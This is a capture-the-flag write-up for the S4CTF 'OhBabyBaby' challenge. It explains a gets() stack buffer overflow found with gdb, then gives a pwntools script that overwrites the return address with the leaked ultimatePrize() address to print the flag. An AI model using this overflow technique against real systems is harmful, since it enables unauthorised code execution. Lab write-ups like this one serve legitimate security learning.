# OhBabyBaby
Thanks to y3noor for clearing queries

## Description
If you don't solve this, Dennis Ritchie will be really heartbroken :(
nc 185.14.184.242 12990

## Files provided
A zip containing [binary](https://github.com/TheRealOddCoder/writeups2021/blob/main/S4CTF/ohbabybaby/ohbabybaby) and [source](https://gist.github.com/TheRealOddCoder/dda04fa1d757f91bb0d5ff7f0c1fa673) is provided

## Writeup
Looking at the source, we can see there is a **ultimatePrize()** that reads **flag.txt**. But this function is never called.
Also, there is **gets()** in **prize()**.

Runnning the binary, we encounter a two scanf() and the memory location of the flag function is displayed. So, to get the flag we need to overflow the buffer in prize() and **rewrite the instruction pointer (rip)** to point to the address of ultimatePrize().
<br/><br/>


![image](https://user-images.githubusercontent.com/42334661/115984164-7e53e880-a55a-11eb-96c8-45c2407a1ba4.png)
<br/><br/>

The buffer size is 64. In gdb, I passed 80 bytes of 'A' to check for segmentation fault. We see a sigsegv and **rip is overwritten** 
<br/><br/>

![sigsegv](https://github.com/TheRealOddCoder/writeups2021/blob/main/S4CTF/ohbabybaby/Screeenshots/sigsegv.png)
<br/><br/>

both **$rbp** and **$rip** are overwritten with **8 bytes** and **6 bytes** respectively. Of the **80 bytes** sent, `14bytes` are overwritten in `rbp` and `rip` meaning that buffer takes up `66 bytes`. Of the `66 bytes`, **2 bytes** are used up in *scanf()*.
<br/><br/>
This is what I thought initially.
- buffer --> 64+2 bytes
- $rbp --> 8 bytes $rip --> 6 bytes

But boy I was wrong. 
<br/>
After a few trial and error, **$rip was overwritten** by anything after 72 bytes of data. That is,
- buffer --> 64 bytes
- $rbp --> 8 bytes
<br/>
To check this, I passed in *72 bytes of 'A' and 2 bytes of 'B'*. And rip was overwritten by *'BB'* (the 73rd and 74th byte in input)


![sigsev](https://github.com/TheRealOddCoder/writeups2021/blob/main/S4CTF/ohbabybaby/Screeenshots/sigsegv_2.png)
<br/><br/>

## Payload
Let's construct a payload with `pwntools` locally
<br/><br/>

```
from pwn import *

bof = b"A"*72
conn = process('./ohbabybaby')
data = conn.recvuntil(".....................................Tap Tap to see your prize!!....................................\n").decode("utf-8")
print(data)
conn.sendline("A")   # so that we can see the address of ultimatePrize
data = conn.recvuntil("............................................Did you enjoy?..........................................").decode("utf-8")
conn.recvuntil("\n")
print(data)
address = "0x"+data.split("0x")[1][:12]
print(address)
conn.recvline()
#conn.sendline(b"A"*72 + p64(int(address, 16)))

try:
    conn.sendline(bof + p64(int(address, 16)))
    print(conn.recvall().decode("utf-8"))
except:
    print("error!\n")
    print(conn.recvall().decode("utf-8"))
```
<br/><br/>

![flag](https://github.com/TheRealOddCoder/writeups2021/blob/main/S4CTF/ohbabybaby/Screeenshots/flag.png)
<br/><br/>
The flag function is accessed!!
Modifying the code to connect to remote address, we get the flag
<br/><br/>
![flag](https://github.com/TheRealOddCoder/writeups2021/blob/main/S4CTF/ohbabybaby/Screeenshots/Screenshot%20from%202021-04-25%2001-30-36.png)
<br/><br/>

## Flag
S4CTF{W311_D0n3_f0r_th3_3xpl0it_Vuln3rability_i5_aws0m3!!}
